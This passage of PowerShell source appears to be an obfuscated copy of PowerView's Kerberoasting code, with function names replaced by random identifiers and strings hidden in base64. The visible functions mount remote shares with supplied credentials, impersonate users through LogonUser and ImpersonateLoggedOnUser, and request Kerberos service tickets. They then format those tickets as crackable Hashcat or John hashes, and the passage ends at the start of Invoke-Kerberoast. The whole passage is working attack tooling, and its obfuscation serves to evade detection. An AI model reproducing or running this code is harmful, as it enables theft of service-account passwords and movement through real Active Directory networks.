        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] -or ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA'))))) {
            if ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                ${51a8c9da8a14409396e8d9dc85c14b70} = $Identity | a4ad8c5db2444528bab99963038ffd7c -d6f8ca3d1c994c23b84c147c1aa4c2c9 Canonical
                if (${51a8c9da8a14409396e8d9dc85c14b70}) {
                    ${a2794736f5b94527ae4a424f44c2ad58} = ${51a8c9da8a14409396e8d9dc85c14b70}.SubString(0, ${51a8c9da8a14409396e8d9dc85c14b70}.IndexOf('/'))
                    ${54d6e2743ef34c4ca2274114ea50c79e} = $Identity.Split('\')[1]
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJAB7AGEAMgA3ADkANAA3ADMANgBmADUAYgA5ADQANQAyADcAYQBlADQAYQA0ADIANABmADQANABjADIAYQBkADUAOAB9ACcA')))
                }
            }
            else {
                ${54d6e2743ef34c4ca2274114ea50c79e} = $Identity
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
                ${a2794736f5b94527ae4a424f44c2ad58} = $Domain
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${084af00cb6d64d1b8aedda7cb962e03c} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${a2794736f5b94527ae4a424f44c2ad58}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${084af00cb6d64d1b8aedda7cb962e03c} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${a2794736f5b94527ae4a424f44c2ad58})
            }
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${5b6c0431b3b24d89847e8188fad980e4} = c57d9aa48a49482b961291cafd0dde18 | Select-Object -ExpandProperty Name
                ${084af00cb6d64d1b8aedda7cb962e03c} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${5b6c0431b3b24d89847e8188fad980e4}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${084af00cb6d64d1b8aedda7cb962e03c} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            ${54d6e2743ef34c4ca2274114ea50c79e} = $Identity
        }
        ${135b3fb143bd49b987991226741987e6} = New-Object PSObject
        ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdAA='))) ${084af00cb6d64d1b8aedda7cb962e03c}
        ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))) ${54d6e2743ef34c4ca2274114ea50c79e}
        ${135b3fb143bd49b987991226741987e6}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAGIAaQBuAGQAaQBuAGcAIABmAG8AcgAgAG8AYgBqAGUAYwB0ACAAKAAnACQASQBkAGUAbgB0AGkAdAB5ACcAKQAgAGMAbwBuAHQAZQB4AHQAIAA6ACAAJABfAA==')))
    }
}
function b62ba051179546ed8285f6844e069492 {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )
    BEGIN {
        ${04f4bda1d08c478a9a901f3fa6e59428} = [Activator]::CreateInstance(${763d2f16c1cf44e2b43076435231be83})
        ${04f4bda1d08c478a9a901f3fa6e59428}.dwType = 1
    }
    PROCESS {
        ${4fbf41a6150d4b0cbd726b1cf5815f38} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${21ce4c4eb6224b4495064b7f5910e227} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${21ce4c4eb6224b4495064b7f5910e227} = ${21ce4c4eb6224b4495064b7f5910e227}.Trim('\')
                ${4fbf41a6150d4b0cbd726b1cf5815f38} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAyADEAYwBlADQAYwA0AGUAYgA2ADIAMgA0AGIANAA0ADkANQAwADYANABiADcAZgA1ADkAMQAwAGUAMgAyADcAfQBcAEkAUABDACQA')))
            }
        }
        else {
            ${4fbf41a6150d4b0cbd726b1cf5815f38} += ,$Path
        }
        ForEach (${f2c826b07a43443aaca3dc6e400f36f1} in ${4fbf41a6150d4b0cbd726b1cf5815f38}) {
            ${04f4bda1d08c478a9a901f3fa6e59428}.lpRemoteName = ${f2c826b07a43443aaca3dc6e400f36f1}
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABtAG8AdQBuAHQAOgAgACQAewBmADIAYwA4ADIANgBiADAANwBhADQAMwA0ADQAMwBhAGEAYwBhADMAZABjADYAZQA0ADAAMABmADMANgBmADEAfQA=')))
            ${186e3848daf342ca8207aeecd0de4352} = ${ed9f34cd11954420929e66b24ca6afac}::WNetAddConnection2W(${04f4bda1d08c478a9a901f3fa6e59428}, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
            if (${186e3848daf342ca8207aeecd0de4352} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYAMgBjADgAMgA2AGIAMAA3AGEANAAzADQANAAzAGEAYQBjAGEAMwBkAGMANgBlADQAMAAwAGYAMwA2AGYAMQB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABtAG8AdQBuAHQAZQBkAA==')))
            }
            else {
                Throw "[Add-RemoteConnection] error mounting ${f2c826b07a43443aaca3dc6e400f36f1} : $(([ComponentModel.Win32Exception]${186e3848daf342ca8207aeecd0de4352}).Message)"
            }
        }
    }
}
function a7d442a86d1b4ceeaa8f4ca925e39550 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        ${4fbf41a6150d4b0cbd726b1cf5815f38} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${21ce4c4eb6224b4495064b7f5910e227} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${21ce4c4eb6224b4495064b7f5910e227} = ${21ce4c4eb6224b4495064b7f5910e227}.Trim('\')
                ${4fbf41a6150d4b0cbd726b1cf5815f38} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAyADEAYwBlADQAYwA0AGUAYgA2ADIAMgA0AGIANAA0ADkANQAwADYANABiADcAZgA1ADkAMQAwAGUAMgAyADcAfQBcAEkAUABDACQA')))
            }
        }
        else {
            ${4fbf41a6150d4b0cbd726b1cf5815f38} += ,$Path
        }
        ForEach (${f2c826b07a43443aaca3dc6e400f36f1} in ${4fbf41a6150d4b0cbd726b1cf5815f38}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIAB1AG4AbQBvAHUAbgB0ADoAIAAkAHsAZgAyAGMAOAAyADYAYgAwADcAYQA0ADMANAA0ADMAYQBhAGMAYQAzAGQAYwA2AGUANAAwADAAZgAzADYAZgAxAH0A')))
            ${186e3848daf342ca8207aeecd0de4352} = ${ed9f34cd11954420929e66b24ca6afac}::WNetCancelConnection2(${f2c826b07a43443aaca3dc6e400f36f1}, 0, $True)
            if (${186e3848daf342ca8207aeecd0de4352} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYAMgBjADgAMgA2AGIAMAA3AGEANAAzADQANAAzAGEAYQBjAGEAMwBkAGMANgBlADQAMAAwAGYAMwA2AGYAMQB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAB1AG0AbQBvAHUAbgB0AGUAZAA=')))
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting ${f2c826b07a43443aaca3dc6e400f36f1} : $(([ComponentModel.Win32Exception]${186e3848daf342ca8207aeecd0de4352}).Message)"
            }
        }
    }
}
function cb88cae78c7042af8720773b18453f4d {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        ${d4e1296b557440d7b406a9378e307719},
        [Switch]
        ${e63bcfc245bf4c15941e2e6d5c906ee3}
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGkAZQB0AA==')))])) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBzACAAbgBvAHQAIABjAHUAcgByAGUAbgB0AGwAeQAgAGkAbgAgAGEAIABzAGkAbgBnAGwAZQAtAHQAaAByAGUAYQBkAGUAZAAgAGEAcABhAHIAdABtAGUAbgB0ACAAcwB0AGEAdABlACwAIAB0AG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAbQBhAHkAIABuAG8AdAAgAHcAbwByAGsALgA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        ${6e0eff131156449daba468e863351ccd} = ${d4e1296b557440d7b406a9378e307719}
    }
    else {
        ${6e0eff131156449daba468e863351ccd} = [IntPtr]::Zero
        ${1974d230895e4c6396635b991cd0d085} = $Credential.GetNetworkCredential()
        $UserDomain = ${1974d230895e4c6396635b991cd0d085}.Domain
        ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = ${1974d230895e4c6396635b991cd0d085}.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$(${25e26cdbb7fa4a6c9a2f2483c34b00e6})"
        ${186e3848daf342ca8207aeecd0de4352} = ${010428763869431e80e18c1b0127d8f7}::LogonUser(${25e26cdbb7fa4a6c9a2f2483c34b00e6}, $UserDomain, ${1974d230895e4c6396635b991cd0d085}.Password, 9, 3, [ref]${6e0eff131156449daba468e863351ccd});${a4b4c23e0ef94f2bab076518375de072} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not ${186e3848daf342ca8207aeecd0de4352}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] ${a4b4c23e0ef94f2bab076518375de072}).Message)"
        }
    }
    ${186e3848daf342ca8207aeecd0de4352} = ${010428763869431e80e18c1b0127d8f7}::ImpersonateLoggedOnUser(${6e0eff131156449daba468e863351ccd})
    if (-not ${186e3848daf342ca8207aeecd0de4352}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] ${a4b4c23e0ef94f2bab076518375de072}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAQQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAZQBkAA==')))
    ${6e0eff131156449daba468e863351ccd}
}
function dcf0a8b111a84302b05d40b1db05338c {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${d4e1296b557440d7b406a9378e307719}
    )
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABSAGUAdgBlAHIAdABpAG4AZwAgAHQAbwBrAGUAbgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABhAG4AZAAgAGMAbABvAHMAaQBuAGcAIABMAG8AZwBvAG4AVQBzAGUAcgAoACkAIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQA=')))
        ${186e3848daf342ca8207aeecd0de4352} = ${7b9c84e547fc47d1bb3f80c1f9625ff8}::CloseHandle(${d4e1296b557440d7b406a9378e307719})
    }
    ${186e3848daf342ca8207aeecd0de4352} = ${010428763869431e80e18c1b0127d8f7}::RevertToSelf();${a4b4c23e0ef94f2bab076518375de072} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not ${186e3848daf342ca8207aeecd0de4352}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] ${a4b4c23e0ef94f2bab076518375de072}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABUAG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAByAGUAdgBlAHIAdABlAGQA')))
}
function e510eb37ce3849408f84b7fb0ba9b850 {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        ${ad4b28078d594068abb862a63d64bc33},
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))) })]
        [Object[]]
        ${a8824b20a55c40d29e08c2f892a05f8e},
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBJAGQAZQBuAHQAaQB0AHkATQBvAGQAZQBsAA=='))))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
            ${cc2d6cd9e888461983c61e2d23cb76d9} = ${a8824b20a55c40d29e08c2f892a05f8e}
        }
        else {
            ${cc2d6cd9e888461983c61e2d23cb76d9} = ${ad4b28078d594068abb862a63d64bc33}
        }
        ForEach ($Object in ${cc2d6cd9e888461983c61e2d23cb76d9}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
                ${50c27b099fbe431cb41c9f311a31a146} = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                ${fb29fd144fd84be7984a06cbbf78531d} = $Object.DistinguishedName
            }
            else {
                ${50c27b099fbe431cb41c9f311a31a146} = $Object
                $SamAccountName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                ${fb29fd144fd84be7984a06cbbf78531d} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            }
            if (${50c27b099fbe431cb41c9f311a31a146} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${50c27b099fbe431cb41c9f311a31a146} = ${50c27b099fbe431cb41c9f311a31a146}[0]
            }
            try {
                ${240674718b954eeca8e27afafb5ff0cb} = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ${50c27b099fbe431cb41c9f311a31a146}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0AF0AIABFAHIAcgBvAHIAIAByAGUAcQB1AGUAcwB0AGkAbgBnACAAdABpAGMAawBlAHQAIABmAG8AcgAgAFMAUABOACAAJwAkAHsANQAwAGMAMgA3AGIAMAA5ADkAZgBiAGUANAAzADEAYwBiADQAMQBjADkAZgAzADEAMQBhADMAMQBhADEANAA2AH0AJwAgAGYAcgBvAG0AIAB1AHMAZQByACAAJwAkAHsAZgBiADIAOQBmAGQAMQA0ADQAZgBkADgANABiAGUANwA5ADgANABhADAANgBjAGIAYgBmADcAOAA1ADMAMQBkAH0AJwAgADoAIAAkAF8A')))
            }
            if (${240674718b954eeca8e27afafb5ff0cb}) {
                ${614d0d1e7894418c8aff0df1de23d504} = ${240674718b954eeca8e27afafb5ff0cb}.GetRequest()
            }
            if (${614d0d1e7894418c8aff0df1de23d504}) {
                ${135b3fb143bd49b987991226741987e6} = New-Object PSObject
                ${5bb410db881d4c119b7ff05501794cb1} = [System.BitConverter]::ToString(${614d0d1e7894418c8aff0df1de23d504}) -replace '-'
                ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $SamAccountName
                ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${fb29fd144fd84be7984a06cbbf78531d}
                ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))) ${240674718b954eeca8e27afafb5ff0cb}.ServicePrincipalName
                if(${5bb410db881d4c119b7ff05501794cb1} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQAzADgAMgAuAC4ALgAuADMAMAA4ADIALgAuAC4ALgBBADAAMAAzADAAMgAwADEAKAA/ADwARQB0AHkAcABlAEwAZQBuAD4ALgAuACkAQQAxAC4AewAxACwANAB9AC4ALgAuAC4ALgAuAC4AQQAyADgAMgAoAD8APABDAGkAcABoAGUAcgBUAGUAeAB0AEwAZQBuAD4ALgAuAC4ALgApAC4ALgAuAC4ALgAuAC4ALgAoAD8APABEAGEAdABhAFQAbwBFAG4AZAA+AC4AKwApAA==')))) {
                    ${0650e8ff76b9437e84b24320c9833f84} = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    ${4f2707250a5741a8b7aef933a2f5f200} = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    ${5f2cdd2805024017b33349c54d82bb4f} = $Matches.DataToEnd.Substring(0,${4f2707250a5741a8b7aef933a2f5f200}*2)
                    if($Matches.DataToEnd.Substring(${4f2707250a5741a8b7aef933a2f5f200}*2, 4) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA0ADgAMgA=')))) {
                        Write-Warning "Error parsing ciphertext for the SPN  $(${240674718b954eeca8e27afafb5ff0cb}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        ${0549d0d3103e4eb395b55a98220040a1} = $null
                        ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${614d0d1e7894418c8aff0df1de23d504}).Replace('-',''))
                    } else {
                        ${0549d0d3103e4eb395b55a98220040a1} = "$(${5f2cdd2805024017b33349c54d82bb4f}.Substring(0,32))`$$(${5f2cdd2805024017b33349c54d82bb4f}.Substring(32))"
                        ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $(${240674718b954eeca8e27afafb5ff0cb}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    ${0549d0d3103e4eb395b55a98220040a1} = $null
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${614d0d1e7894418c8aff0df1de23d504}).Replace('-',''))
                }
                if(${0549d0d3103e4eb395b55a98220040a1}) {
                    if ($OutputFormat -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGgAbgA=')))) {
                        ${c9478d92c9c8460bab445df0d2402d15} = "`$krb5tgs`$$(${240674718b954eeca8e27afafb5ff0cb}.ServicePrincipalName):${0549d0d3103e4eb395b55a98220040a1}"
                    }
                    else {
                        if (${fb29fd144fd84be7984a06cbbf78531d} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))) {
                            $UserDomain = ${fb29fd144fd84be7984a06cbbf78531d}.SubString(${fb29fd144fd84be7984a06cbbf78531d}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                        else {
                            $UserDomain = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                        }
                        ${c9478d92c9c8460bab445df0d2402d15} = "`$krb5tgs`$$(${0650e8ff76b9437e84b24320c9833f84})`$*$SamAccountName`$$UserDomain`$$(${240674718b954eeca8e27afafb5ff0cb}.ServicePrincipalName)*`$${0549d0d3103e4eb395b55a98220040a1}"
                    }
                    ${135b3fb143bd49b987991226741987e6} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABhAHMAaAA='))) ${c9478d92c9c8460bab445df0d2402d15}
                }
                ${135b3fb143bd49b987991226741987e6}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAFAATgBUAGkAYwBrAGUAdAA='))))
                ${135b3fb143bd49b987991226741987e6}
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Invoke-Kerberoast {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${fd6c4173863b4be9aa10603a30f19bb1} = @{
            'SPN' = $True
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
